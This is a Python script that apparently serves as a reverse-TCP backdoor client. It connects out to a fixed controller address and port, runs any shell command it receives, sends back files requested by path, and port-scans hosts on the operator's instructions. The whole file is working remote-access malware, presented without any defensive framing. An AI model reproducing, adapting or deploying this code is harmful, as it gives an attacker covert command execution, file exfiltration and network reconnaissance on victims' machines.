#  grab and port scanner  reverse tcp
import os
import socket
import subprocess

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()

def scanner(s, ip, ports):
    scan_result = ''
    for port in ports.split(','):
        try: #
            sock =  socket.socket()
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed"
                sock.close()
        except Exception as e:
            pass
    s.send(scan_result.encode())
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.23', 4448))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split('*')
            try:
                transfer(s, path)
            except:
                s.send(str(e).encode())
                pass

        elif 'scan' in command.decode(): #
            command = command[5:].decode()
            ip, ports = command.split(':')
            scanner(s, ip, ports)
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()

main()
